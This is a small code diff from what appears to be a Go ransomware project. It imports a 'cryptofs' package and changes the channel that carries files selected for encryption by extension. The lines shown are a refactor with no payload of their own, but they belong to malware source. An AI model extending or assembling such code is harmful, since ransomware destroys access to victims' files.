@@ -5,6 +5,8 @@ import (
 	"log"
 	"os"
 	"runtime"
+
+	"github.com/mauri870/ransomware/cryptofs"
 )
 
 var (
@@ -50,7 +52,7 @@ var (
 	}
 
 	// Files to encrypt that match the extensions pattern
-	MatchedFiles = make(chan File)
+	MatchedFiles = make(chan *cryptofs.File)
 
 	// Workers processing the files
 	NumWorkers = 2
